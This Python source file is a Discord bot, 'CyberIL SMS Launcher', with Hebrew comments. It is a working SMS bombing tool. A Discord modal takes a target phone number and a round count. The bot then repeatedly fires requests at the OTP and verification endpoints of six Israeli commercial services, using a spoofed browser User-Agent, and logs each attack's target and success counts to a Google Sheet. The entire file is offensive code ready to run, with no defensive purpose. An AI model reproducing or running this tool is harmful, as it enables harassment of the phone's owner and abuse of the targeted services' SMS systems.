import discord
from discord import app_commands
from discord.ext import commands
import os
import requests
import asyncio
from datetime import datetime

# משתני סביבה מ-Railway
TOKEN = os.getenv('DISCORD_TOKEN')
GSHEET_URL = os.getenv('GSHEET_URL')

# ניהול עצירות לפי משתמש
active_attacks = {}

class CyberBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        super().__init__(command_prefix="!", intents=intents)

    async def setup_hook(self):
        await self.tree.sync()

bot = CyberBot()

# --- פונקציית הלוג לשייטס החדש ---
def send_to_sheet(user_name, user_id, phone, rounds, success, failed):
    if not GSHEET_URL:
        return
    # חשוב: שמות המפתחות כאן חייבים להתאים למה שכתבנו ב-Apps Script
    payload = {
        "user_name": user_name,
        "user_id": str(user_id),
        "target_phone": phone,
        "rounds": rounds,
        "success_count": success,
        "failed_count": failed
    }
    try:
        requests.post(GSHEET_URL, json=payload, timeout=10)
    except:
        print("❌ GSheet Log Error")

# --- מנוע ה-API ---
def api_request(url, payload, is_json=True):
    try:
        headers = {"User-Agent": "Mozilla/5.0"}
        if is_json:
            r = requests.post(url, json=payload, headers=headers, timeout=4)
        else:
            r = requests.post(url, data=payload, headers=headers, timeout=4)
        return r.status_code in [200, 201]
    except:
        return False

async def fire_round(phone):
    tasks = [
        asyncio.to_thread(api_request, "https://users-auth.hamal.co.il/auth/send-auth-code", {"value": phone, "type": "phone", "projectId": "1"}),
        asyncio.to_thread(api_request, "https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber", {"phoneNumber": phone}),
        asyncio.to_thread(api_request, "https://api.dominos.co.il/sendOtp", {"otpMethod": "text", "customerId": phone, "language": "he", "requestNum": 8}),
        asyncio.to_thread(api_request, "https://api-ns.atmos.co.il/rest/1/auth/sendValidationCode", {"restaurant_id": 1, "phone": phone, "testing": False}),
        asyncio.to_thread(api_request, "https://www.castro.com/customer/ajax/post/", {"type": "login", "telephone": phone, "bot_validation": "1"}, False),
        asyncio.to_thread(api_request, "https://oidc.quick-login.com/authorize", {"client_id": "quicklogin-renuar-shop", "phone_number": "+972" + phone[1:], "lang": "he"}, False)
    ]
    results = await asyncio.gather(*tasks)
    return sum(results), len(results) - sum(results)

# --- לוגיקת הרצה ---
async def start_attack(interaction, phone, rounds):
    uid = interaction.user.id
    uname = interaction.user.name
    active_attacks[uid] = True
    
    total_s, total_f = 0, 0
    rounds_int = int(rounds)
    
    for i in range(rounds_int):
        if not active_attacks.get(uid):
            break
        
        s, f = await fire_round(phone)
        total_s += s
        total_f += f
        await asyncio.sleep(2)
    
    # שליחת הלוג לסיום/עצירה לגיליון החדש
    send_to_sheet(uname, uid, phone, rounds_int, total_s, total_f)
    active_attacks.pop(uid, None)

# --- ממשק דיסקורד ---
class AttackControl(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="🚀 התחל הפצצה", style=discord.ButtonStyle.danger)
    async def start_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        class BombModal(discord.ui.Modal, title="CyberIL - SMS Launcher"):
            phone = discord.ui.TextInput(label="מספר טלפון", min_length=10, max_length=10)
            rounds = discord.ui.TextInput(label="כמות סיבובים", default="10")
            async def on_submit(self, modal_inter: discord.Interaction):
                await modal_inter.response.send_message(f"💣 הפצצה על {self.phone.value} החלה!", ephemeral=True)
                asyncio.create_task(start_attack(modal_inter, self.phone.value, self.rounds.value))
        await interaction.response.send_modal(BombModal())

    @discord.ui.button(label="🛑 עצור", style=discord.ButtonStyle.secondary)
    async def stop_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id in active_attacks:
            active_attacks[interaction.user.id] = False
            await interaction.response.send_message("🚨 עוצר...", ephemeral=True)
        else:
            await interaction.response.send_message("אין הפצצה פעילה.", ephemeral=True)

@bot.tree.command(name="setup", description="לוח בקרה")
async def setup(interaction: discord.Interaction):
    embed = discord.Embed(title="⚡ CyberIL SMS System", color=0x000000)
    await interaction.response.send_message(embed=embed, view=AttackControl())

bot.run(TOKEN)
